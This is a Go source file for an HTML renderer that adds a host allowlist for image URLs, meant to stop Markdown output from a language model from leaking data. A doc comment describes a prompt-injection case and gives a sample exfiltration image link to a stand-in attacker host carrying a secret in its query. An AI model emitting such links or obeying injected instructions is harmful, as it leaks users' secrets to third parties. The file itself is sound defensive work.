package html

import "strings"

// URLKind says how a rendered document uses a destination, which is what
// decides how dangerous it is.
type URLKind uint8

const (
	// LinkURL is a navigation target, rendered as <a href>. It is fetched only
	// if the reader clicks it.
	LinkURL URLKind = iota
	// ImageURL is a resource the browser fetches as soon as the document
	// renders, rendered as <img src>. No click is needed, which is what makes
	// it a data-exfiltration channel for model output.
	ImageURL
)

// String implements fmt.Stringer.
func (k URLKind) String() string {
	switch k {
	case LinkURL:
		return "link"
	case ImageURL:
		return "image"
	}
	return "unknown"
}

// URLPolicy vets one link or image destination. It receives the destination
// after entity decoding — the string a browser would act on — and returns the
// destination to emit, or ok == false to refuse it. A refused link keeps its
// text with an empty href; a refused image renders as its alt text and is
// never fetched.
//
// A policy is the defence for Markdown written by a language model. Prompt
// injection can make a model emit ![](https://attacker.example/?q=<secret>),
// and a chat UI that renders it leaks the secret the moment the page loads.
// Scheme filtering (SafeLinks) cannot see this: the URL is ordinary https.
//
// It is called concurrently when a parser renders with Workers, so it must be
// safe for concurrent use.
type URLPolicy func(kind URLKind, dest string) (string, bool)

// AllowImageHosts returns a [URLPolicy] that loads images only from the named
// hosts and from relative references, and leaves links untouched. A host
// matches case-insensitively and ignores the port; a pattern beginning "*."
// also matches every subdomain of the rest ("*.example.com" matches
// "cdn.example.com" but not "example.com"). With no hosts, every absolute image
// URL is refused, which suits a chat UI that serves no remote images at all.
func AllowImageHosts(hosts ...string) URLPolicy {
	exact := make(map[string]bool, len(hosts))
	var suffixes []string
	for _, h := range hosts {
		h = strings.ToLower(h)
		if rest, ok := strings.CutPrefix(h, "*."); ok {
			suffixes = append(suffixes, "."+rest)
			continue
		}
		exact[h] = true
	}
	return func(kind URLKind, dest string) (string, bool) {
		if kind != ImageURL {
			return dest, true
		}
		host, relative, ok := browserHost(dest)
		if relative {
			return dest, true // same-origin reference
		}
		if !ok {
			return "", false
		}
		if exact[host] {
			return dest, true
		}
		for _, s := range suffixes {
			if strings.HasSuffix(host, s) {
				return dest, true
			}
		}
		return "", false
	}
}

// browserHost extracts the host a browser would fetch dest from, following
// the WHATWG URL parser rather than net/url: leading and trailing spaces and
// controls are stripped, tabs and newlines anywhere are removed, and for http
// and https a backslash counts as a slash and any number of slashes may precede
// the authority — so "https:\\evil.example" and "https:/evil.example" both
// name evil.example, which net/url would read as a path.
//
// relative reports a reference with no scheme and no authority, which stays on
// the document's own origin. ok is false for anything that is neither relative
// nor a plain http(s) URL with a host this function can vouch for: another
// scheme, an empty host, or a percent-encoded host (which a browser decodes).
func browserHost(dest string) (host string, relative, ok bool) {
	dest = strings.TrimFunc(dest, func(r rune) bool { return r <= ' ' })
	if strings.ContainsAny(dest, "\t\n\r") {
		dest = strings.NewReplacer("\t", "", "\n", "", "\r", "").Replace(dest)
	}
	rest := dest
	if scheme, after, found := cutScheme(dest); found {
		if scheme != "http" && scheme != "https" {
			return "", false, false
		}
		rest = strings.TrimLeft(after, "/\\")
	} else {
		if len(rest) < 2 || !isSlash(rest[0]) || !isSlash(rest[1]) {
			return "", true, false
		}
		rest = strings.TrimLeft(rest, "/\\")
	}
	if i := strings.IndexAny(rest, "/\\?#"); i >= 0 {
		rest = rest[:i]
	}
	if i := strings.LastIndexByte(rest, '@'); i >= 0 {
		rest = rest[i+1:] // drop userinfo
	}
	if strings.HasPrefix(rest, "[") {
		end := strings.IndexByte(rest, ']')
		if end < 0 {
			return "", false, false
		}
		rest = rest[:end+1]
	} else if i := strings.LastIndexByte(rest, ':'); i >= 0 {
		rest = rest[:i] // drop port
	}
	rest = strings.TrimSuffix(strings.ToLower(rest), ".")
	if rest == "" || strings.ContainsRune(rest, '%') {
		return "", false, false
	}
	return rest, false, true
}

func isSlash(c byte) bool { return c == '/' || c == '\\' }

// cutScheme splits a URL scheme off s, lower-cased, when s starts with one.
func cutScheme(s string) (scheme, rest string, found bool) {
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c == ':':
			if i == 0 {
				return "", s, false
			}
			return strings.ToLower(s[:i]), s[i+1:], true
		case i == 0 && !isSchemeStart(c):
			return "", s, false
		case !isSchemeByte(c):
			return "", s, false
		}
	}
	return "", s, false
}
